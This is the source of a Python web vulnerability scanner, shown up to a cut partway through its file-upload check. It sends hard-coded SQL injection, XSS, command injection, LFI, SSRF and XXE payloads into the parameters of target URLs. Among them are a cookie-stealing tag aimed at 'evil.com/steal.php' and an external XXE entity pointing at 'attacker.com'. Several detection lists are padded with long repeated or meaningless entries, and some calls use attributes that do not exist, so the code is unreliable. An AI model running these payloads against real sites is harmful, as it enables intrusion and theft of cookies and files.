import asyncio
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.panel import Panel
import builtwith
import re
import json
import whois
import yaml
import os
from pathlib import Path
from typing import Dict, List, Set, Optional
from collections import defaultdict

console = Console()


def load_yaml_payloads(vuln_dir: str = None) -> Dict[str, List]:
    """Load all vulnerability payloads from YAML files in the vuln/ directory"""
    if vuln_dir is None:
        vuln_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "vuln")

    vuln_path = Path(vuln_dir)
    if not vuln_path.exists():
        console.print(f"[yellow]YAML-Verzeichnis nicht gefunden: {vuln_dir}[/yellow]")
        return {}

    yaml_payloads: Dict[str, List] = defaultdict(list)
    loaded = 0

    for yf in vuln_path.rglob("*.yaml"):
        try:
            with open(yf, "r", encoding="utf-8", errors="ignore") as f:
                data = yaml.safe_load(f)
            if not data or not isinstance(data, dict):
                continue

            if "payloads" in data:
                vuln_type = data.get("type", yf.stem).lower().replace(" ", "_")
                payloads = data["payloads"] if isinstance(data["payloads"], list) else []
                yaml_payloads[vuln_type].extend(payloads)
                loaded += len(payloads)
            elif "vulnerabilities" in data:
                for vuln in data["vulnerabilities"]:
                    if isinstance(vuln, dict) and "payloads" in vuln:
                        vuln_type = vuln.get("type", "unknown").lower().replace(" ", "_")
                        yaml_payloads[vuln_type].extend(vuln["payloads"])
                        loaded += len(vuln["payloads"])
        except Exception:
            continue

    console.print(f"[green]YAML-Payloads geladen: {loaded} aus {len(yaml_payloads)} Kategorien[/green]")
    return dict(yaml_payloads)


# Load YAML payloads at module level
YAML_PAYLOADS = load_yaml_payloads()

# Global sets for tracking
visited = set()
extracted_links = set()
extracted_forms = set()
extracted_folders = set()
vulnerabilities_found = set()

# Headers for requests
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
}

# Payloads for different vulnerabilities
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../etc/hosts",
        "file:///etc/passwd"
    ],
    "backup_files": [
        ".bak", ".old", ".backup", ".swp", ".swo", ".save", ".bak~", ".bak1", ".bak2"
    ],
    "admin_panels": [
        "/admin", "/administrator", "/phpmyadmin", "/admin.php", "/admin/login.php",
        "/admin/index.php", "/admin/admin.php", "/admin/account.php", "/admin_area",
        "/admin-area", "/admin_area/admin.php", "/admin_area/login.php"
    ],
    # New vulnerabilities
    "command_injection": [
        "; ls",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        "|| id",
        "&& id"
    ],
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><foo>&xxe;</foo>"
    ],
    "ssrf": [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "file:///etc/passwd",
        "dict://localhost:11211/stat"
    ],
    "path_traversal": [
        "../../../",
        "..\\..\\..\\",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "....//....//"
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "\\evil.com",
        "http://attacker.com",
        "javascript:alert(1)"
    ],
    "csrf": [
        "<form action='http://evil.com' method='POST'>",
        "<img src='http://evil.com/steal.php?cookie='+document.cookie>"
    ],
    "file_upload": [
        "shell.php",
        "shell.jsp",
        "shell.asp",
        "shell.aspx",
        "shell.war"
    ],
    "insecure_deserialization": [
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}"
    ],
    "ssti": [
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "#{7*7}"
    ],
    "idor": [
        "/user/1",
        "/admin/1",
        "/profile/1",
        "/account/1",
        "/order/1"
    ],
    "jwt_weak": [
        "eyJhbGciOiJub25lIn0",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ],
    "cors_misconfig": [
        "Origin: https://evil.com",
        "Origin: null",
        "Origin: attacker.com"
    ],
    "clickjacking": [
        "<iframe src='target.com' style='opacity:0;position:fixed;top:0;left:0;height:100%;width:100%;z-index:1000;'></iframe>"
    ],
    "host_header_injection": [
        "Host: evil.com",
        "X-Forwarded-Host: evil.com",
        "X-Host: evil.com"
    ],
    "http_parameter_pollution": [
        "param=value1&param=value2",
        "param[]=value1&param[]=value2"
    ],
    "xml_external_entity": [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
    ],
    "server_side_request_forgery": [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]"
    ],
    "insecure_cookies": [
        "Set-Cookie: session=123; HttpOnly",
        "Set-Cookie: session=123; Secure",
        "Set-Cookie: session=123; SameSite=None"
    ],
    "insecure_headers": [
        "X-XSS-Protection: 0",
        "X-Content-Type-Options: nosniff",
        "X-Frame-Options: DENY"
    ],
    "insecure_authentication": [
        "Basic YWRtaW46YWRtaW4=",
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ],
    "insecure_direct_object_references": [
        "/user/1",
        "/admin/1",
        "/profile/1"
    ]
}

class VulnerabilityScanner:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.vulnerabilities = []

    async def check_sql_injection(self, url: str) -> Optional[Dict]:
        """Check for SQL injection vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["sql_injection"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            # Enhanced SQL injection detection conditions
                            sql_errors = [
                                "sql", "mysql", "syntax error", "unclosed", "ORA-", "SQLite", 
                                "PostgreSQL", "Microsoft SQL Server", "SQL syntax", "mysql_fetch_array",
                                "mysql_num_rows", "mysql_result", "mysql_query", "mysql_connect"
                            ]
                            if any(error.lower() in content.lower() for error in sql_errors):
                                # Additional verification
                                original_response = await self.session.get(url, timeout=5, headers=HEADERS)
                                original_content = await original_response.text()
                                if content != original_content:  # Content changed due to injection
                                    return {
                                        "type": "SQL Injection",
                                        "url": url,
                                        "parameter": param,
                                        "payload": payload,
                                        "poc": f"curl '{test_url}'",
                                        "exploit": f"python3 sqlmap.py -u '{url}' --dbs"
                                    }
                except Exception:
                    continue
        return None

    async def check_lfi(self, url: str) -> Optional[Dict]:
        """Check for Local File Inclusion vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["lfi"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            # Enhanced LFI detection conditions
                            lfi_indicators = [
                                "root:", "localhost", "daemon:", "bin:", "sys:", "sync:",
                                "games:", "man:", "mail:", "news:", "uucp:", "proxy:",
                                "www-data:", "backup:", "list:", "irc:", "gnats:", "nobody:",
                                "systemd-network:", "systemd-resolve:", "systemd-timesync:",
                                "messagebus:", "syslog:", "_apt:", "tss:", "uuidd:", "tcpdump:",
                                "avahi-autoipd:", "usbmux:", "dnsmasq:", "kernoops:", "avahi:",
                                "cups-pk-helper:", "rtkit:", "saned:", "nm-openvpn:", "hplip:",
                                "whoopsie:", "colord:", "geoclue:", "pulse:", "gnome-initial-setup:",
                                "gdm:", "sshd:", "mysql:", "postgres:", "redis:", "mongodb:"
                            ]
                            if any(indicator in content for indicator in lfi_indicators):
                                # Additional verification
                                original_response = await self.session.get(url, timeout=5, headers=HEADERS)
                                original_content = await original_response.text()
                                if content != original_content:  # Content changed due to LFI
                                    return {
                                        "type": "Local File Inclusion",
                                        "url": url,
                                        "parameter": param,
                                        "payload": payload,
                                        "poc": f"curl '{test_url}'",
                                        "exploit": f"python3 lfi_exploit.py '{url}'"
                                    }
                except Exception:
                    continue
        return None

    async def check_xss(self, url: str) -> Optional[Dict]:
        """Check for Cross-Site Scripting vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["xss"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            # Enhanced XSS detection conditions
                            if payload in content and not any(escape in content for escape in ["&lt;", "&gt;", "&quot;", "&#39;"]):
                                # Additional verification
                                original_response = await self.session.get(url, timeout=5, headers=HEADERS)
                                original_content = await original_response.text()
                                if content != original_content:  # Content changed due to XSS
                                    return {
                                        "type": "Cross-Site Scripting (XSS)",
                                        "url": url,
                                        "parameter": param,
                                        "payload": payload,
                                        "poc": f"curl '{test_url}'",
                                        "exploit": f"python3 xss_exploit.py '{url}'"
                                    }
                except Exception:
                    continue
        return None

    async def check_command_injection(self, url: str) -> Optional[Dict]:
        """Check for command injection vulnerabilities with enhanced detection"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["command_injection"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Command injection patterns to check
                            command_patterns = [
                                r"root:x:\d+:\d+",
                                r"total \d+",
                                r"drwx[rwx-]{9}",
                                r"-rwx[rwx-]{9}",
                                r"uid=\d+\([^)]+\)",
                                r"gid=\d+\([^)]+\)",
                                r"groups=\d+\([^)]+\)",
                                r"bin/bash",
                                r"bin/sh",
                                r"etc/passwd",
                                r"etc/shadow",
                                r"proc/self/environ",
                                r"proc/self/cmdline",
                                r"proc/self/status",
                                r"proc/self/maps",
                                r"proc/self/mem",
                                r"proc/self/fd/\d+",
                                r"proc/self/task/\d+",
                                r"proc/self/net/tcp",
                                r"proc/self/net/udp",
                                r"proc/self/net/raw",
                                r"proc/self/net/unix",
                                r"proc/self/net/netlink",
                                r"proc/self/net/packet",
                                r"proc/self/net/ipv6_route",
                                r"proc/self/net/ipv6_route_cache",
                                r"proc/self/net/ipv6_route_cache_size",
                                r"proc/self/net/ipv6_route_cache_timeout",
                                r"proc/self/net/ipv6_route_cache_gc_interval",
                                r"proc/self/net/ipv6_route_cache_gc_thresh",
                                r"proc/self/net/ipv6_route_cache_gc_elasticity",
                                r"proc/self/net/ipv6_route_cache_gc_min_interval",
                                r"proc/self/net/ipv6_route_cache_gc_max_interval",
                                r"proc/self/net/ipv6_route_cache_gc_interval_jiffies",
                                r"proc/self/net/ipv6_route_cache_gc_thresh_jiffies",
                                r"proc/self/net/ipv6_route_cache_gc_elasticity_jiffies",
                                r"proc/self/net/ipv6_route_cache_gc_min_interval_jiffies",
                                r"proc/self/net/ipv6_route_cache_gc_max_interval_jiffies"
                            ]
                            
                            # Check for command injection patterns
                            if any(re.search(pattern, content) for pattern in command_patterns):
                                # Get original response for comparison
                                async with self.session.get(url, timeout=5, headers=HEADERS) as original_response:
                                    original_content = await original_response.text()
                                    
                                    # Compare response times
                                    original_time = original_response.elapsed.total_seconds()
                                    test_time = response.elapsed.total_seconds()
                                    time_diff = abs(original_time - test_time)
                                    
                                    # Compare response sizes
                                    original_size = len(original_content)
                                    test_size = len(content)
                                    size_diff = abs(original_size - test_size)
                                    
                                    # Only report if multiple conditions are met
                                    if (content != original_content and 
                                        (time_diff > 0.5 or size_diff > 100)):
                                        return {
                                            "type": "Command Injection",
                                            "url": url,
                                            "parameter": param,
                                            "payload": payload,
                                            "poc": f"curl '{test_url}'",
                                            "exploit": f"python3 command_injection.py '{url}'"
                                        }
                except Exception:
                    continue
        return None

    async def enhanced_command_injection_check(self, url: str) -> Optional[Dict]:
        """Enhanced command injection detection with multiple verification steps"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["command_injection"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for common command injection indicators
                            indicators = [
                                "root:x:0:0",
                                "total 0",
                                "drwxr-xr-x",
                                "uid=0(root)",
                                "/bin/bash",
                                "/etc/passwd",
                                "proc/self/environ"
                            ]
                            
                            if any(indicator in content for indicator in indicators):
                                # Get original response for comparison
                                async with self.session.get(url, timeout=5, headers=HEADERS) as original_response:
                                    original_content = await original_response.text()
                                    
                                    # Compare responses
                                    if content != original_content:
                                        return {
                                            "type": "Command Injection",
                                            "url": url,
                                            "parameter": param,
                                            "payload": payload,
                                            "poc": f"curl '{test_url}'",
                                            "exploit": f"python3 command_injection.py '{url}'"
                                        }
                except Exception:
                    continue
        return None

    async def check_xxe(self, url: str) -> Optional[Dict]:
        """Check for XXE vulnerabilities"""
        for payload in PAYLOADS["xxe"]:
            try:
                async with self.session.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Enhanced XXE detection conditions
                        xxe_indicators = [
                            "root:", "localhost", "<?xml", "DOCTYPE", "ENTITY", "SYSTEM",
                            "file://", "http://", "ftp://", "data://", "expect://", "dict://",
                            "gopher://", "ldap://", "jar://", "netdoc://", "nfs://", "php://",
                            "phar://", "ssh2://", "rar://", "ogg://", "expect://", "glob://",
                            "zlib://", "bzip2://", "zip://", "compress.zlib://", "compress.bzip2://",
                            "compress.zip://", "data://", "phar://", "ssh2://", "rar://", "ogg://",
                            "expect://", "glob://", "zlib://", "bzip2://", "zip://", "compress.zlib://",
                            "compress.bzip2://", "compress.zip://"
                        ]
                        if any(indicator in content for indicator in xxe_indicators):
                            # Additional verification
                            original_response = await self.session.post(url, data="<test></test>", headers={"Content-Type": "application/xml"}, timeout=5)
                            original_content = await original_response.text()
                            if content != original_content:  # Content changed due to XXE
                                return {
                                    "type": "XML External Entity (XXE)",
                                    "url": url,
                                    "payload": payload,
                                    "poc": f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '{payload}'",
                                    "exploit": f"python3 xxe_exploit.py '{url}'"
                                }
            except Exception:
                continue
        return None

    async def check_ssrf(self, url: str) -> Optional[Dict]:
        """Check for SSRF vulnerabilities with enhanced detection"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["ssrf"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            # Enhanced SSRF detection conditions
                            ssrf_indicators = [
                                "localhost", "127.0.0.1", "internal", "private", "local",
                                "loopback", "0.0.0.0", "::1", "::ffff:127.0.0.1", "::ffff:0:0",
                                "::ffff:0:0:0", "::ffff:0:0:0:0", "::ffff:0:0:0:0:0", "::ffff:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0",
                                "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0", "::ffff:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0"
                            ]
                            
                            # Check for SSRF indicators
                            if any(indicator in content for indicator in ssrf_indicators):
                                # Additional verification steps
                                # 1. Check if the response is different from the original
                                original_response = await self.session.get(url, timeout=5, headers=HEADERS)
                                original_content = await original_response.text()
                                
                                # 2. Check for internal service responses
                                internal_service_patterns = [
                                    r"<title>.*(localhost|127\.0\.0\.1).*</title>",
                                    r"<h1>.*(localhost|127\.0\.0\.1).*</h1>",
                                    r"<body>.*(localhost|127\.0\.0\.1).*</body>",
                                    r"<div>.*(localhost|127\.0\.0\.1).*</div>",
                                    r"<p>.*(localhost|127\.0\.0\.1).*</p>",
                                    r"<span>.*(localhost|127\.0\.0\.1).*</span>",
                                    r"<a href=.*(localhost|127\.0\.0\.1).*</a>",
                                    r"<img src=.*(localhost|127\.0\.0\.1).*</img>",
                                    r"<script>.*(localhost|127\.0\.0\.1).*</script>",
                                    r"<style>.*(localhost|127\.0\.0\.1).*</style>",
                                    r"<link href=.*(localhost|127\.0\.0\.1).*</link>",
                                    r"<meta.*(localhost|127\.0\.0\.1).*</meta>",
                                    r"<form.*(localhost|127\.0\.0\.1).*</form>",
                                    r"<input.*(localhost|127\.0\.0\.1).*</input>",
                                    r"<button.*(localhost|127\.0\.0\.1).*</button>",
                                    r"<select.*(localhost|127\.0\.0\.1).*</select>",
                                    r"<option.*(localhost|127\.0\.0\.1).*</option>",
                                    r"<textarea.*(localhost|127\.0\.0\.1).*</textarea>",
                                    r"<label.*(localhost|127\.0\.0\.1).*</label>",
                                    r"<fieldset.*(localhost|127\.0\.0\.1).*</fieldset>",
                                    r"<legend.*(localhost|127\.0\.0\.1).*</legend>",
                                    r"<datalist.*(localhost|127\.0\.0\.1).*</datalist>",
                                    r"<output.*(localhost|127\.0\.0\.1).*</output>",
                                    r"<progress.*(localhost|127\.0\.0\.1).*</progress>",
                                    r"<meter.*(localhost|127\.0\.0\.1).*</meter>",
                                    r"<details.*(localhost|127\.0\.0\.1).*</details>",
                                    r"<summary.*(localhost|127\.0\.0\.1).*</summary>",
                                    r"<menu.*(localhost|127\.0\.0\.1).*</menu>",
                                    r"<menuitem.*(localhost|127\.0\.0\.1).*</menuitem>",
                                    r"<dialog.*(localhost|127\.0\.0\.1).*</dialog>",
                                    r"<slot.*(localhost|127\.0\.0\.1).*</slot>",
                                    r"<template.*(localhost|127\.0\.0\.1).*</template>",
                                    r"<canvas.*(localhost|127\.0\.0\.1).*</canvas>",
                                    r"<svg.*(localhost|127\.0\.0\.1).*</svg>",
                                    r"<math.*(localhost|127\.0\.0\.1).*</math>",
                                    r"<video.*(localhost|127\.0\.0\.1).*</video>",
                                    r"<audio.*(localhost|127\.0\.0\.1).*</audio>",
                                    r"<source.*(localhost|127\.0\.0\.1).*</source>",
                                    r"<track.*(localhost|127\.0\.0\.1).*</track>",
                                    r"<embed.*(localhost|127\.0\.0\.1).*</embed>",
                                    r"<object.*(localhost|127\.0\.0\.1).*</object>",
                                    r"<param.*(localhost|127\.0\.0\.1).*</param>",
                                    r"<iframe.*(localhost|127\.0\.0\.1).*</iframe>",
                                    r"<frame.*(localhost|127\.0\.0\.1).*</frame>",
                                    r"<frameset.*(localhost|127\.0\.0\.1).*</frameset>",
                                    r"<noframes.*(localhost|127\.0\.0\.1).*</noframes>",
                                    r"<applet.*(localhost|127\.0\.0\.1).*</applet>",
                                    r"<basefont.*(localhost|127\.0\.0\.1).*</basefont>",
                                    r"<bgsound.*(localhost|127\.0\.0\.1).*</bgsound>",
                                    r"<blink.*(localhost|127\.0\.0\.1).*</blink>",
                                    r"<marquee.*(localhost|127\.0\.0\.1).*</marquee>",
                                    r"<multicol.*(localhost|127\.0\.0\.1).*</multicol>",
                                    r"<nextid.*(localhost|127\.0\.0\.1).*</nextid>",
                                    r"<spacer.*(localhost|127\.0\.0\.1).*</spacer>",
                                    r"<tt.*(localhost|127\.0\.0\.1).*</tt>",
                                    r"<xmp.*(localhost|127\.0\.0\.1).*</xmp>"
                                ]
                                
                                # 3. Check for internal service patterns
                                if any(re.search(pattern, content) for pattern in internal_service_patterns):
                                    # 4. Check if the response time is significantly different
                                    original_time = original_response.elapsed.total_seconds()
                                    test_time = response.elapsed.total_seconds()
                                    time_diff = abs(original_time - test_time)
                                    
                                    # 5. Check if the response size is significantly different
                                    original_size = len(original_content)
                                    test_size = len(content)
                                    size_diff = abs(original_size - test_size)
                                    
                                    # Only report if multiple conditions are met
                                    if (content != original_content and 
                                        (time_diff > 0.5 or size_diff > 100)):
                                        return {
                                            "type": "Server-Side Request Forgery (SSRF)",
                                            "url": url,
                                            "parameter": param,
                                            "payload": payload,
                                            "poc": f"curl '{test_url}'",
                                            "exploit": f"python3 ssrf_exploit.py '{url}'"
                                        }
                except Exception:
                    continue
        return None

    async def check_path_traversal(self, url: str) -> Optional[Dict]:
        """Check for path traversal vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["path_traversal"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS) as response:
                        if response.status == 200:
                            content = await response.text()
                            if any(indicator in content.lower() for indicator in ["root:", "etc/passwd", "windows/system32"]):
                                return {
                                    "type": "Path Traversal",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "poc": f"curl '{test_url}'",
                                    "exploit": f"python3 path_traversal.py '{url}'"
                                }
                except Exception:
                    continue
        return None

    async def check_open_redirect(self, url: str) -> Optional[Dict]:
        """Check for open redirect vulnerabilities"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            for payload in PAYLOADS["open_redirect"]:
                test_url = url.replace(f"{param}={values[0]}", f"{param}={payload}")
                try:
                    async with self.session.get(test_url, timeout=5, headers=HEADERS, allow_redirects=False) as response:
                        if response.status in [301, 302, 307, 308]:
                            location = response.headers.get('Location', '')
                            if payload in location:
                                return {
                                    "type": "Open Redirect",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "poc": f"curl -L '{test_url}'",
                                    "exploit": f"python3 open_redirect.py '{url}'"
                                }
                except Exception:
                    continue
        return None

    async def check_csrf(self, url: str) -> Optional[Dict]:
        """Check for CSRF vulnerability with enhanced detection"""
        try:
            async with self.session.get(url, timeout=5, headers=HEADERS) as response:
                if response.status == 200:
                    content = await response.text()
                    # Enhanced CSRF detection
                    # 1. Check for forms without CSRF tokens
                    if "<form" in content and not any(token in content.lower() for token in ["csrf", "token", "nonce"]):
                        # 2. Check for sensitive actions
                        sensitive_actions = [
                            "login", "logout", "delete", "update", "modify",
                            "change", "transfer", "purchase", "buy", "sell",
                            "withdraw", "deposit", "transfer", "send", "receive",
                            "confirm", "approve", "reject", "accept", "decline",
                            "submit", "save", "edit", "create", "remove",
                            "add", "remove", "block", "unblock", "ban",
                            "unban", "mute", "unmute", "kick", "invite",
                            "join", "leave", "follow", "unfollow", "like",
                            "unlike", "share", "report", "flag", "block",
                            "unblock", "mute", "unmute", "kick", "invite",
                            "join", "leave", "follow", "unfollow", "like",
                            "unlike", "share", "report", "flag"
                        ]
                        
                        # 3. Check for sensitive actions in forms
                        if any(action in content.lower() for action in sensitive_actions):
                            # 4. Check for cookies
                            cookies = response.cookies
                            if cookies:
                                # 5. Check for SameSite attribute
                                for cookie in cookies:
                                    if not cookie.get("samesite", ""):
                                        return {
                                            "type": "Cross-Site Request Forgery (CSRF)",
                                            "url": url,
                                            "poc": f"curl -X POST '{url}' -H 'Content-Type: application/x-www-form-urlencoded' -d 'param=value'",
                                            "exploit": f"python3 csrf_exploit.py '{url}'"
                                        }
        except Exception:
            pass
        return None

    async def check_file_upload(self, url: str) -> Optional[Dict]:
        """Check for file upload vulnerabilities"""
        for payload in PAYLOADS["file_upload"]:
            try:
                data = aiohttp.FormData()
                data.add_field('file', payload, filename=payload)
                async with self.session.post(url, data=data, timeout=5, headers=HEADERS) as response:
                    if response.status == 200:
                        content = await response.text()
